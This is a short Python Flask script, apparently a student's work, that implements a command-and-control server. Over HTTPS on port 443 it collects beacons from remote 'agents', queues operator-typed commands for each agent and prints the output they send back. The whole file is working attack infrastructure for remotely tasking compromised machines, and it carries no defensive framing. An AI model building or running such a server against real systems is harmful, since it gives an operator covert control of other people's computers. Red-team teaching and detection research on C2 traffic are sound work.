# Name: Shane Russell
# Email: smr7408@rit.edu

# Generate cert and key for https in same script folder before use:
# Command: openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365

import threading, logging
from flask import Flask, request, jsonify

# Stop intrusive flask logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
queues = {}
active_agents = set()

# beacon endpoint, processing command queues
@app.route('/b', methods=['POST'])
def beacon():
    data = request.json
    agent_id = data.get('id')

    active_agents.add(agent_id)

    # handling command for user specified agent
    if agent_id in queues and queues[agent_id]:
        command = queues[agent_id].pop(0)
        print(f"\n{agent_id} task: {command}")
        return jsonify({"task": command})
    return jsonify({"task": None})

# result endpoint
@app.route('/r', methods=['POST'])
def result():
    data = request.json
    print(f"\n{data.get('id')} result:\n\n{data.get('output')}", flush=True)
    return jsonify({"s": 1})

# running server in background (https)
def run():
    app.run(host="0.0.0.0", port=443, ssl_context=('cert.pem', 'key.pem'))

def main():
    # run server in background thread to allow input loop in main thread
    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    
    print("\nC2_SERVER:443")
    # command input loop
    while True:
        try:
            if active_agents:
                print(f"Connected: {', '.join(active_agents)}")
            cmd_input = input("\n").strip()
            if ":" in cmd_input:
                target_id, task = cmd_input.split(":", 1)
                if target_id not in queues:
                    queues[target_id] = []
                queues[target_id].append(task.strip())
        except KeyboardInterrupt:
            print("\nShutting down...")
            break

if __name__ == "__main__":
    main()